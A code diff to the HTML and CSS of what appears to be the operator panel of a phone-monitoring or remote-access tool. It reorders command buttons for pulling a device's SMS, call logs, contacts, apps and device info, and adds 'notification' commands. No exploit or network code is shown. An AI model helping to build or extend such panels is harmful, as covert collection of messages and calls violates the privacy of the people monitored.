@@ -112,7 +112,7 @@ canvas{
 /* COMMAND GRID FIXED */
 .commands{
     display:grid;
-    grid-template-columns:repeat(4, 1fr);   /* EXACTLY 4 PER ROW */
+    grid-template-columns:repeat(4, 1fr);
     gap:25px;
 }
 
@@ -172,7 +172,7 @@ canvas{
     color:#000;
 }
 
-/* MOBILE = 2 PER ROW (UNCHANGED) */
+/* MOBILE = 2 PER ROW */
 @media(max-width:768px){
 
     body{
@@ -184,7 +184,7 @@ canvas{
     }
 
     .commands{
-        grid-template-columns:repeat(2, 1fr);  /* KEEP 2 PER ROW */
+        grid-template-columns:repeat(2, 1fr);
         gap:15px;
     }
 
@@ -210,19 +210,27 @@ canvas{
 
 <div class="commands">
 
-<div class="command" data-cmd="sms full">sms full</div>
-<div class="command" data-cmd="sms 30d">sms 30d</div>
-<div class="command" data-cmd="sms 7d">sms 7d</div>
-<div class="command" data-cmd="sms 1d">sms 1d</div>
+<div class="command" data-cmd="deviceinfo">deviceinfo</div>
 
-<div class="command" data-cmd="calls full">calls full</div>
-<div class="command" data-cmd="calls 30d">calls 30d</div>
-<div class="command" data-cmd="calls 7d">calls 7d</div>
-<div class="command" data-cmd="calls 1d">calls 1d</div>
+<div class="command" data-cmd="apps full">apps full</div>
 
 <div class="command" data-cmd="contacts full">contacts full</div>
-<div class="command" data-cmd="apps full">apps full</div>
-<div class="command" data-cmd="deviceinfo">deviceinfo</div>
+
+<div class="command" data-cmd="sms full">sms full</div>
+<div class="command" data-cmd="sms 1d">sms 1d</div>
+<div class="command" data-cmd="sms 7d">sms 7d</div>
+<div class="command" data-cmd="sms 30d">sms 30d</div>
+
+<div class="command" data-cmd="calls full">calls full</div>
+<div class="command" data-cmd="calls 1d">calls 1d</div>
+<div class="command" data-cmd="calls 7d">calls 7d</div>
+<div class="command" data-cmd="calls 30d">calls 30d</div>
+
+<div class="command" data-cmd="notification full">notification full</div>
+<div class="command" data-cmd="notification 1d">notification 1d</div>
+<div class="command" data-cmd="notification 7d">notification 7d</div>
+<div class="command" data-cmd="notification 30d">notification 30d</div>
+
 <div class="command" data-cmd="connection">connection</div>
 
 <div class="command" data-cmd="none">none</div>
